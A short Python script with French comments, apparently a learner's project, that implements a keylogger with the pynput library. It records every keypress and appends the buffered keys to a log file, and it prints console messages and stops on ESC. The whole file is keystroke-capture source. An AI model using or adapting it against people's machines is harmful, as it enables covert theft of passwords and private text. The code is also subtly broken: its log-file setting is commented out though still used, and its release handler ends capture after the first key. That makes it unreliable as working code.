from pynput import keyboard

import threading #arrier plan

from datetime import datetime #horaire chaque frape

import os

#───────────────────────── HOOKS SYSTEME ─────────────────────────

# ── CONFIGURATION ────────────────────────────────────────────

#LOG_FILE = "keylog.txt" #data teste 
BUFFER_SIZE = 20 #attendre pour pas reouvrire a chaque foi sinon bug

# ── VARIABLES GLOBALES ───────────────────────────────────────
buffer = []

lock = threading.Lock()

# ── FONCTIONS UTILITAIRES ────────────────────────────────────
def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"

def flush_buffer():
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("".join(buffer))

    buffer.clear()#vide la liste aprés ecrit 

# ── CALLBACKS : LE CŒUR DU LISTENER ─────────────────────────
def onpress(key):
    timestamp = datetime.now().strftime("%H:%M:%S")
    key_str = format_key(key)
    if key_str is None: #si pas reconue
        return

# ── THREAD SAFETY ──────────────────────────────────────
    with lock:
        buffer.append(key_str) #pour eviter les donner corrompues
    if len(buffer) >= BUFFER_SIZE:
        flush_buffer()
        print(f"[{timestamp}] Capturé : {key_str}")
def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] Touche ESC détectée — arrêt du listener.")

    with lock:
        if buffer:
            flush_buffer()
    return False

# ── CLASSE PRINCIPALE : KeyLogger ───────────────────────────
class KeyLogger:
    def __init__(self):
        self.listener = None 

        self.is_running = False

    def start(self):
        print("[*] Démarrage du listener...")
        print(f"[*] Logs écrits dans : {os.path.abspath(LOG_FILE)}")
        print("[*]ESC pour stop.\n")
        self.is_running = True

        self.listener = keyboard.Listener(
            on_press=onpress,
            on_release=on_release
        )

        self.listener.start()
        self.listener.join()

        self.is_running = False
        print("[*] arreté propre")

    def stop(self):
        if self.listener and self.is_running:
            self.listener.stop()

# ── POINT D'ENTRÉE (test standalone) ────────────────────────
if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()